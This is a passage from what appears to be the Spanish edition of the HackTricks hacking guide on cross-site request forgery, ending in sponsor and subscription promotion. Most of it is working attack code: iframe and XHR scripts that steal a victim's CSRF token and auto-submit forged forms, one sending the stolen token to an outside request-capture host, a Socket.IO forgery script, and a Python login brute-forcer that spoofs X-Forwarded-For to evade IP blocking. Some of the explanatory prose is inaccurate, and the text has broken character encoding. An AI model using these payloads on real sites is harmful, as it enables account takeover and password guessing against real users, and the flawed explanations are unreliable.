Una t√©cnica com√∫n para llevar a cabo un ataque de falsificaci√≥n de solicitudes entre sitios (CSRF) es robar el token CSRF de un usuario y luego utilizarlo para enviar una solicitud POST maliciosa. Esto se puede lograr mediante el uso de un iframe y un formulario.

1. Primero, es necesario obtener el token CSRF del usuario. Esto se puede hacer mediante ingenier√≠a inversa o mediante la explotaci√≥n de una vulnerabilidad en la aplicaci√≥n web.

2. Una vez que se ha obtenido el token CSRF, se puede utilizar un iframe para cargar una p√°gina maliciosa en el navegador del usuario. El iframe debe apuntar a la p√°gina que se desea atacar.

```html
<iframe src="http://www.paginaobjetivo.com"></iframe>
```

3. Dentro de la p√°gina maliciosa, se debe incluir un formulario que contenga el token CSRF robado y los par√°metros necesarios para la solicitud POST maliciosa.

```html
<form action="http://www.paginaobjetivo.com/accion" method="POST">
  <input type="hidden" name="csrf_token" value="TOKEN_CSRF_ROBADO">
  <input type="hidden" name="parametro1" value="valor1">
  <input type="hidden" name="parametro2" value="valor2">
  <input type="submit" value="Enviar">
</form>
```

4. Cuando el usuario carga la p√°gina maliciosa, el formulario se enviar√° autom√°ticamente debido al uso del atributo `action` en el formulario. Esto enviar√° la solicitud POST con el token CSRF robado y los par√°metros necesarios.

Es importante tener en cuenta que este tipo de ataque solo funcionar√° si el usuario tiene una sesi√≥n activa en la p√°gina objetivo y si la p√°gina no implementa medidas de protecci√≥n adecuadas, como la verificaci√≥n del origen de la solicitud. Los desarrolladores deben implementar medidas de seguridad, como tokens CSRF aleatorios y verificaci√≥n del origen de la solicitud, para protegerse contra este tipo de ataques.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Robar token y enviarlo usando 2 iframes**

En esta t√©cnica de CSRF, el atacante roba el token de autenticaci√≥n de la v√≠ctima y lo env√≠a a trav√©s de dos iframes. El objetivo es enga√±ar al navegador de la v√≠ctima para que realice una solicitud no deseada en nombre del usuario autenticado.

El proceso se divide en los siguientes pasos:

1. El atacante crea una p√°gina web maliciosa que contiene dos iframes. Uno de los iframes se carga con la p√°gina de destino que se desea atacar, mientras que el otro se carga con una p√°gina controlada por el atacante.

2. Cuando la v√≠ctima visita la p√°gina maliciosa, el navegador carga los iframes autom√°ticamente.

3. El iframe controlado por el atacante realiza una solicitud GET a la p√°gina de destino, aprovechando el token de autenticaci√≥n almacenado en las cookies de la v√≠ctima.

4. La p√°gina de destino recibe la solicitud y la procesa como si fuera leg√≠tima, ya que incluye el token de autenticaci√≥n v√°lido.

5. El atacante puede aprovechar esta solicitud para realizar acciones no autorizadas en nombre de la v√≠ctima, como cambiar la contrase√±a, realizar compras o realizar cualquier otra acci√≥n permitida por la p√°gina de destino.

Es importante destacar que esta t√©cnica solo funciona si la p√°gina de destino no implementa medidas de protecci√≥n contra CSRF, como tokens de solicitud aleatorios o verificaci√≥n de origen. Por lo tanto, es fundamental que los desarrolladores implementen estas medidas de seguridad para proteger sus aplicaciones web contra este tipo de ataques.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTRobar token CSRF con Ajax y enviar un post con un formulario**

En esta t√©cnica, aprovechamos una vulnerabilidad de Cross-Site Request Forgery (CSRF) para robar el token CSRF de un usuario y luego enviar una solicitud POST utilizando Ajax y un formulario.

1. Primero, necesitamos obtener el token CSRF del usuario. Esto se puede hacer mediante ingenier√≠a social o mediante la explotaci√≥n de una vulnerabilidad en el sitio web objetivo.

2. Una vez que tenemos el token CSRF, podemos usar Ajax para enviar una solicitud POST al servidor objetivo. Aqu√≠ est√° el c√≥digo de ejemplo:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://www.example.com/endpoint", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("X-CSRF-Token", "<TOKEN_CSRF>");
xhr.send("param1=value1&param2=value2");
```

Aseg√∫rate de reemplazar "https://www.example.com/endpoint" con la URL del punto final al que deseas enviar la solicitud POST. Adem√°s, reemplaza "<TOKEN_CSRF>" con el token CSRF que has obtenido.

3. Tambi√©n podemos enviar una solicitud POST utilizando un formulario oculto. Aqu√≠ est√° el c√≥digo de ejemplo:

```html
<form id="csrfForm" action="https://www.example.com/endpoint" method="POST">
  <input type="hidden" name="param1" value="value1">
  <input type="hidden" name="param2" value="value2">
  <input type="hidden" name="X-CSRF-Token" value="<TOKEN_CSRF>">
</form>

<script>
  document.getElementById("csrfForm").submit();
</script>
```

Al igual que antes, aseg√∫rate de reemplazar "https://www.example.com/endpoint" con la URL del punto final al que deseas enviar la solicitud POST. Adem√°s, reemplaza "<TOKEN_CSRF>" con el token CSRF que has obtenido.

Estas t√©cnicas permiten a un atacante enviar solicitudes POST en nombre del usuario sin su conocimiento, lo que puede llevar a acciones no deseadas o maliciosas. Es importante que los desarrolladores implementen medidas de protecci√≥n adecuadas, como el uso de tokens CSRF y la validaci√≥n de referencias, para mitigar este tipo de ataques.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF con Socket.IO

Socket.IO es una biblioteca de JavaScript que permite la comunicaci√≥n bidireccional en tiempo real entre el cliente y el servidor. Aunque Socket.IO proporciona una capa de seguridad incorporada, a√∫n es posible que un atacante aproveche una vulnerabilidad de falsificaci√≥n de solicitudes entre sitios (CSRF) para realizar acciones no deseadas en nombre del usuario.

#### ¬øQu√© es CSRF?

La falsificaci√≥n de solicitudes entre sitios (CSRF) es un tipo de ataque en el que un atacante enga√±a a un usuario para que realice una acci√≥n no deseada en un sitio web en el que el usuario est√° autenticado. Esto se logra enga√±ando al usuario para que haga clic en un enlace o bot√≥n malicioso que realiza una solicitud HTTP en segundo plano sin su conocimiento.

#### CSRF con Socket.IO

Socket.IO utiliza cookies para mantener la sesi√≥n del usuario y autenticar las solicitudes entrantes. Sin embargo, las cookies no son suficientes para proteger contra ataques CSRF. Un atacante puede enga√±ar a un usuario para que visite un sitio web malicioso que contiene c√≥digo JavaScript que realiza solicitudes a un servidor Socket.IO leg√≠timo en nombre del usuario autenticado.

Para protegerse contra ataques CSRF en Socket.IO, se pueden implementar las siguientes medidas:

1. **Verificaci√≥n de origen**: El servidor Socket.IO debe verificar el origen de cada solicitud entrante para asegurarse de que provenga de un dominio confiable. Esto se puede hacer comparando el encabezado "Origin" de la solicitud con una lista blanca de dominios permitidos.

2. **Token CSRF**: Se puede generar un token CSRF √∫nico para cada sesi√≥n de usuario y enviarlo al cliente como una cookie o un encabezado personalizado. El cliente debe incluir este token en cada solicitud a Socket.IO y el servidor debe verificar su validez antes de procesar la solicitud.

3. **Referer Header**: El servidor Socket.IO puede verificar el encabezado "Referer" de cada solicitud para asegurarse de que provenga de una p√°gina leg√≠tima en lugar de un sitio malicioso.

Implementar estas medidas de seguridad puede ayudar a prevenir ataques CSRF en aplicaciones que utilizan Socket.IO. Es importante tener en cuenta que estas medidas deben combinarse con otras pr√°cticas de seguridad, como la validaci√≥n de entrada y la protecci√≥n contra XSS, para garantizar una protecci√≥n completa contra ataques en la aplicaci√≥n web.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Ataque de Fuerza Bruta en el Inicio de Sesi√≥n

El c√≥digo se puede utilizar para realizar un ataque de fuerza bruta en un formulario de inicio de sesi√≥n utilizando un token CSRF (tambi√©n utiliza el encabezado X-Forwarded-For para intentar evadir un posible bloqueo de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Herramientas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referencias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender m√°s sobre errores web3**

üêû Lee tutoriales sobre errores web3

üîî Recibe notificaciones sobre nuevas recompensas por errores

üí¨ Participa en discusiones de la comunidad

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres que tu **empresa sea anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
